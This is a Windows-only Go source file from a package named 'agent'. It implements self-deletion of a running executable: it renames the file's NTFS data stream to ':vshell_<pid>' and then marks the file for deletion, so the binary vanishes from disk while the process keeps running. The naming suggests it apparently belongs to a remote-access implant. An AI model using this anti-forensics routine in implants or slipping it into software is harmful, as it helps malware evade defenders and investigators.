//go:build windows

package agent

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	deleteAccess        = 0x00010000
	synchronizeAccess   = 0x00100000
	fileShareRead       = 0x00000001
	openExisting        = 3
	fileAttributeNormal = 0x00000080
	fileRenameInfo      = 3
	fileDispositionInfo = 4
)

type fileRenameInfoHeader struct {
	ReplaceIfExists uint32
	RootDirectory   uintptr
	FileNameLength  uint32
}

var setFileInformationByHandle = syscall.NewLazyDLL("kernel32.dll").NewProc("SetFileInformationByHandle")

// Rename the executable's unnamed NTFS data stream, then mark the now-unbound
// file for deletion. The already-mapped image remains alive while the original
// directory entry disappears immediately.
func deleteRunningExecutable() error {
	path, err := os.Executable()
	if err != nil {
		return err
	}
	path16, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	openDeleteHandle := func() (syscall.Handle, error) {
		return syscall.CreateFile(path16, deleteAccess|synchronizeAccess, fileShareRead, nil, openExisting, fileAttributeNormal, 0)
	}

	h, err := openDeleteHandle()
	if err != nil {
		return err
	}

	stream, err := syscall.UTF16FromString(fmt.Sprintf(":vshell_%x", os.Getpid()))
	if err != nil {
		_ = syscall.CloseHandle(h)
		return err
	}
	stream = stream[:len(stream)-1]
	headerSize := int(unsafe.Offsetof(fileRenameInfoHeader{}.FileNameLength)) + 4
	renameBuf := make([]byte, headerSize+len(stream)*2)
	header := (*fileRenameInfoHeader)(unsafe.Pointer(&renameBuf[0]))
	header.FileNameLength = uint32(len(stream) * 2)
	for i, ch := range stream {
		renameBuf[headerSize+i*2] = byte(ch)
		renameBuf[headerSize+i*2+1] = byte(ch >> 8)
	}
	r1, _, callErr := setFileInformationByHandle.Call(
		uintptr(h),
		fileRenameInfo,
		uintptr(unsafe.Pointer(&renameBuf[0])),
		uintptr(len(renameBuf)),
	)
	_ = syscall.CloseHandle(h)
	if r1 == 0 {
		return fmt.Errorf("SetFileInformationByHandle(FileRenameInfo): %w", callErr)
	}

	h, err = openDeleteHandle()
	if err != nil {
		return err
	}
	deleteFile := byte(1)
	r1, _, callErr = setFileInformationByHandle.Call(
		uintptr(h),
		fileDispositionInfo,
		uintptr(unsafe.Pointer(&deleteFile)),
		unsafe.Sizeof(deleteFile),
	)
	_ = syscall.CloseHandle(h)
	if r1 == 0 {
		return fmt.Errorf("SetFileInformationByHandle(FileDispositionInfo): %w", callErr)
	}
	return nil
}
